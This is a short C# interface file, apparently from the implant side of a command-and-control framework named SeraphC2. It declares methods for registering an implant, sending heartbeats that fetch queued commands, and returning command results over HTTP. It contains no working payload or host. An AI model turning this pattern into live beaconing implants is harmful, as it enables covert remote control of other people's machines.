using SeraphC2.Implant.Models;

namespace SeraphC2.Implant.Communication;

public interface IHttpClientWrapper : IDisposable
{
    Task<bool> RegisterImplantAsync(ImplantRegistration registration, CancellationToken cancellationToken = default);
    Task<IEnumerable<CommandMessage>?> SendHeartbeatAsync(HeartbeatMessage heartbeat, CancellationToken cancellationToken = default);
    Task<bool> SendCommandResultAsync(CommandResult result, CancellationToken cancellationToken = default);
}